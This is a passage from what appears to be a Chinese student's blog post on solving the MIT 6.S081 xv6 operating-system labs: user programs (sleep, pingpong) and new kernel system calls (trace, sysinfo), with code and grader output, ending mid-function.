class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout util         <span class="comment"># 切换到util分支</span></span><br><span class="line">git checkout -b util_test <span class="comment"># 建立并切换到util的测试分支</span></span><br></pre></td></tr></table></figure><p>当你在<em><strong>util_test*</strong>分支中每测试通过一个作业，请提交（<code>git commit</code>）你的代码，并将所做的修改合并（<code>git merge</code>）到</em><strong>util*</strong>中，然后提交（<code>git push</code>）到github</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;完成了第一个作业&quot;</span></span><br><span class="line">git checkout util</span><br><span class="line">git merge util_test</span><br><span class="line">git push github util:util</span><br></pre></td></tr></table></figure><h1 id="lab1">lab1</h1><p>实验指导书：https://pdos.csail.mit.edu/6.828/2020/labs/util.html</p><h2 id="sleep">sleep</h2><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please enter a number!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = atoi( argv[<span class="number">1</span>]);</span><br><span class="line">        sleep(n);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yutao@ubuntu:~/xv6-<span class="built_in">labs</span><span class="number">-2020</span>$ sudo python3 grade-lab-util sleep</span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to date.</span><br><span class="line">== Test sleep, no arguments == sleep, no arguments: OK (<span class="number">1.6</span>s) </span><br><span class="line">== Test sleep, returns == sleep, returns: OK (<span class="number">1.0</span>s) </span><br><span class="line">== Test sleep, makes syscall == sleep, makes syscall: OK (<span class="number">0.9</span>s) </span><br></pre></td></tr></table></figure><h2 id="pingpong">pingpong</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="comment">// 编写一个程序，使用UNIX系统调用在一对管道上的两</span></span><br><span class="line"><span class="comment">// 个进程之间“乒乓”一个字节，每个方向一个。父级应向子</span></span><br><span class="line"><span class="comment">// 级发送一个字节；子进程应该打印“：received ping”，</span></span><br><span class="line"><span class="comment">// 其中是其进程ID，将管道上的字节写入父进程，然后退出；</span></span><br><span class="line"><span class="comment">// 父进程应该从子进程读取字节，打印“：received pong”，</span></span><br><span class="line"><span class="comment">// 然后退出。您的解决方案应该在文件“user/pingpong.c”中。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> READEND 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITTEND 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *parmsg = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *chimsg = <span class="string">&quot;b&quot;</span>;</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) <span class="comment">// child processs</span></span><br><span class="line">    &#123;</span><br><span class="line">        read(p[READEND], buf, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child receive: %c\n&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, getpid());</span><br><span class="line">        write(p[WRITTEND], chimsg, <span class="number">1</span>);</span><br><span class="line">        close(p[READEND]);</span><br><span class="line">        close(p[WRITTEND]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        write(p[WRITTEND], parmsg, <span class="number">1</span>);</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">        read(p[READEND], buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent receive: %c\n&quot;</span>, buf[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, getpid());</span><br><span class="line">        close(p[WRITTEND]);</span><br><span class="line">        close(p[READEND]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// yutao@ubuntu:~/xv6-labs-2020$ sudo python3 grade-lab-util pingpong</span></span><br><span class="line"><span class="comment">// make: &#x27;kernel/kernel&#x27; is up to date.</span></span><br><span class="line"><span class="comment">// == Test pingpong == pingpong: OK (1.9s)</span></span><br></pre></td></tr></table></figure><h2 id="prime">prime</h2><p>使用的方法是埃拉托斯特尼素数筛，简称筛法。简单地说就是，每次得到一个素数时，在所有小于 n 的数中，删除它的倍数，然后不断迭代，剩下的就全是素数了。</p><p><img src="/2022/07/10/2022-7-10-oslab/sieve.gif"></p><h1 id="lab2-system-calls">Lab2 system calls</h1><blockquote><p>实验指导书：https://pdos.csail.mit.edu/6.828/2020/labs/syscall.html</p></blockquote><p>需要读xv6book的第2章、4.3、4.4.</p><p>用户空间的系统调用在：<code>user/user.h和user/usys.pl</code></p><p>kernel空间的系统调用在：<code>kernel/kernel.h和kernel/syscall.c</code></p><p>与process相关的代码在：<code>kernel/proc.h &amp;&amp; kernel/proc.c</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout syscall</span><br><span class="line">$ make clean</span><br></pre></td></tr></table></figure><h2 id="system-call-tracing">System call tracing</h2><blockquote><p>In this assignment you will add a system call tracing feature that may help you when debugging later labs. You'll create a new trace system call that will control tracing. It should take one argument, an integer "mask", whose bits specify which system calls to trace. For example, to trace the fork system call, a program calls trace(1 &lt;&lt; SYS_fork), where SYS_fork is a syscall number from kernel/syscall.h. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call's number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don't need to print the system call arguments. The trace system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes.</p></blockquote><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ trace <span class="number">32</span> grep hello README</span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">1023</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">966</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">70</span></span><br><span class="line"><span class="number">3</span>: syscall read -&gt; <span class="number">0</span></span><br><span class="line">$</span><br><span class="line">$ trace <span class="number">2147483647</span> grep hello README</span><br><span class="line"><span class="number">4</span>: syscall trace -&gt; <span class="number">0</span></span><br><span class="line"><span class="number">4</span>: syscall exec -&gt; <span class="number">3</span></span><br><span class="line"><span class="number">4</span>: syscall open -&gt; <span class="number">3</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">1023</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">966</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">70</span></span><br><span class="line"><span class="number">4</span>: syscall read -&gt; <span class="number">0</span></span><br><span class="line"><span class="number">4</span>: syscall close -&gt; <span class="number">0</span></span><br><span class="line">$</span><br><span class="line">$ grep hello README</span><br><span class="line">$</span><br><span class="line">$ trace <span class="number">2</span> usertests forkforkfork</span><br><span class="line">usertests starting</span><br><span class="line">test forkforkfork: <span class="number">407</span>: syscall fork -&gt; <span class="number">408</span></span><br><span class="line"><span class="number">408</span>: syscall fork -&gt; <span class="number">409</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">410</span></span><br><span class="line"><span class="number">410</span>: syscall fork -&gt; <span class="number">411</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">412</span></span><br><span class="line"><span class="number">410</span>: syscall fork -&gt; <span class="number">413</span></span><br><span class="line"><span class="number">409</span>: syscall fork -&gt; <span class="number">414</span></span><br><span class="line"><span class="number">411</span>: syscall fork -&gt; <span class="number">415</span></span><br><span class="line">...</span><br><span class="line">$</span><br></pre></td></tr></table></figure><blockquote><p>In the first example above, trace invokes grep tracing just the read system call. The 32 is 1&lt;&lt;SYS_read. In the second example, trace runs grep while tracing all system calls; the 2147583647 has all 31 low bits set. In the third example, the program isn't traced, so no trace output is printed. In the fourth example, the fork system calls of all the descendants of the forkforkfork test in usertests are being traced. Your solution is correct if your program behaves as shown above (though the process IDs may be different).</p></blockquote><p>在这个实验里，我们需要让内核输出每个mask变量指定的系统函数的调用情况，格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;pid&gt;: syscall &lt;syscall_name&gt; -&gt; &lt;return_value&gt;</span><br></pre></td></tr></table></figure><h3 id="hints">hints</h3><ol type="1"><li>Add <code>$U/_trace</code> to UPROGS in Makefile</li><li>添加声明到<code>user/user.h</code>中</li><li>添加一个<code>entry</code>到<code>user/usys.pl</code></li><li>添加一个syscall number到<code>kernel/syscall.h</code>中</li><li>添加<code>sys_trace()</code>函数到<code>kernel/sysproc.c</code>中</li><li>修改<code>kernel/proc.h</code>中的proc结构体(记录当前进程信息)，添加一个mask值，用来识别system number</li></ol><p>proc结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Per-process state</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// p-&gt;lock must be held when using these:</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">procstate</span> <span class="title">state</span>;</span> <span class="comment">// Process state</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">parent</span>;</span>  <span class="comment">// Parent process</span></span><br><span class="line">  <span class="keyword">void</span> *chan;           <span class="comment">// If non-zero, sleeping on chan</span></span><br><span class="line">  <span class="keyword">int</span> killed;           <span class="comment">// If non-zero, have been killed</span></span><br><span class="line">  <span class="keyword">int</span> xstate;           <span class="comment">// Exit status to be returned to parent&#x27;s wait</span></span><br><span class="line">  <span class="keyword">int</span> pid;              <span class="comment">// Process ID</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// these are private to the process, so p-&gt;lock need not be held.</span></span><br><span class="line">  uint64 kstack;               <span class="comment">// Virtual address of kernel stack</span></span><br><span class="line">  uint64 sz;                   <span class="comment">// Size of process memory (bytes)</span></span><br><span class="line">  <span class="keyword">pagetable_t</span> pagetable;       <span class="comment">// User page table</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">trapframe</span>;</span> <span class="comment">// data page for trampoline.S</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span>      <span class="comment">// swtch() here to run process</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">ofile</span>[<span class="title">NOFILE</span>];</span>  <span class="comment">// Open files</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">cwd</span>;</span>           <span class="comment">// Current directory</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">16</span>];               <span class="comment">// Process name (debugging)</span></span><br><span class="line">  <span class="keyword">int</span> mask;                    <span class="comment">// system call</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>sys_trace具体实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="comment">// argint检索的是第n个系统调用的参数，因此不包括系统调用本身，传入的参数为0</span></span><br><span class="line"><span class="keyword">if</span> (argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">myproc()-&gt;mask = n;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改<code>kernel/proc.c</code>中的<code>fork</code>函数，添加子进程复制父进程mask：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;mask = p-&gt;mask;</span><br></pre></td></tr></table></figure><p>修改<code>kernel/syscall.c</code>，添加<code>SYS_trace</code>的声明，之后加到syscall的数组中，然后添加trace的识别功能。</p><p><code>p-&gt;trapframe-&gt;a0</code>中存放的是函数调用的返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> uint64 <span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">uint64</span> <span class="params">(*syscalls[])</span><span class="params">(<span class="keyword">void</span>)</span> </span>= &#123;</span><br><span class="line">.....</span><br><span class="line">[SYS_close] sys_close,</span><br><span class="line">[SYS_trace] sys_trace,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> *sysCallName[<span class="number">23</span>] = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line"> <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;dup&quot;</span>, <span class="string">&quot;getpid&quot;</span>, <span class="string">&quot;sbrk&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line"> <span class="string">&quot;open&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;trace&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">num = p-&gt;trapframe-&gt;a7;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line"><span class="keyword">if</span> (p-&gt;mask &amp; (<span class="number">1</span> &lt;&lt; num))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, sysCallName[num], p-&gt;trapframe-&gt;a0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">   p-&gt;pid, p-&gt;name, num);</span><br><span class="line">p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ sudo python3 grade-lab-syscall trace</span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to date.</span><br><span class="line">== Test trace 32 grep == trace 32 grep: OK (1.4s) </span><br><span class="line">== Test trace all grep == trace all grep: OK (1.0s) </span><br><span class="line">== Test trace nothing == trace nothing: OK (1.0s) </span><br><span class="line">== Test trace children == trace children: OK (12.1s) </span><br></pre></td></tr></table></figure><h2 id="sysinfo">Sysinfo</h2><blockquote><p>https://github.com/whileskies/xv6-labs-2020/blob/main/doc/Lab2-system%20calls.md</p></blockquote><blockquote><p>In this assignment you will add a system call, sysinfo, that collects information about the running system. The system call takes one argument: a pointer to a struct sysinfo (see kernel/sysinfo.h). The kernel should fill out the fields of this struct: the freemem field should be set to the number of bytes of free memory, and the nproc field should be set to the number of processes whose state is not UNUSED. We provide a test program sysinfotest; you pass this assignment if it prints "sysinfotest: OK".</p></blockquote><p>添加一个系统调用<code>sysinfo</code>，用于收集有关正在运行的系统的信息。系统调用采用一个参数：指向结构<code>sysinfo</code>的指针（参见<code>kernel/sysinfo.h</code>）。内核应填写此结构的字段：<code>freemem</code>字段应设置为可用内存的字节数，<code>nproc</code>字段应设置为其状态未使用的进程数。提供了一个测试程序sysinfotest；如果输出“sysinfotest:OK”，则通过此分配。</p><ol type="1"><li>添加<code>$U/_sysinfotest\</code></li><li>添加函数声明到<code>user.h</code>，添加<code>entry</code>到<code>usys.pl</code>，添加<code>syscall number</code>到<code>syscall.h</code>，然后加入到<code>syscall</code>函数数组中</li><li>然后为了添加<code>sys_sysinfo</code>函数到<code>kernel/sysproc.c</code>，这里为了实现需要在<code>kernel/proc.c</code>和<code>kernel/kalloc.c</code>中分别添加函数获取正在使用的进程和可用的内存数，然后记得将添加的函数声明在<code>defs.h</code></li><li>然后实现<code>sys_sysinfo</code>函数，这里需要看一下<code>copyout</code>函数的使用方法(参考<code>sys_fstat(kernel/sysfile.c)</code>和<code>filestat(kernel/file.c)</code>)</li></ol><p>添加函数声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sysinfo</span><span class="params">(struct sysinfo *)</span></span>;</span><br></pre></td></tr></table></figure><p>添加<code>entry</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure><p>添加<code>syscall</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//syscall.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYS_sysinfo 23</span></span><br></pre></td></tr></table></figure><p>加到<code>syscallname</code>的数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//还有syscalls的数组也要加</span></span><br><span class="line"><span class="keyword">char</span> *sysCallName[<span class="number">24</span>] = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;fork&quot;</span>, <span class="string">&quot;exit&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;exec&quot;</span>,</span><br><span class="line"> <span class="string">&quot;fstat&quot;</span>, <span class="string">&quot;chdir&quot;</span>, <span class="string">&quot;dup&quot;</span>, <span class="string">&quot;getpid&quot;</span>, <span class="string">&quot;sbrk&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;uptime&quot;</span>,</span><br><span class="line"> <span class="string">&quot;open&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="string">&quot;trace&quot;</span>, <span class="string">&quot;sysinfo&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p><code>kernel/proc.c</code>加<code>processNum</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">processNum</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">uint64 cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (p = proc; p &lt; proc[NPROC]; p++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;state != UNUSED)</span><br><span class="line">&#123;</span><br><span class="line">cnt++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>kalloc.c</code>加<code>getFreeMemory</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">getFreeMemory</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"><span class="keyword">for</span> (r = kmem.freelist; r; r = r-&gt;next, num++)</span><br><span class="line">;</span><br><span class="line"><span class="keyword">return</span> num * PGSIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后在<code>defs.h</code>中添加声明</p><p><code>sysproc.c</code>加<code>sys_sysinfo</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">uint64 addr;</span><br><span class="line"><span class="keyword">if</span> (argaddr(<span class="number">0</span>, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span 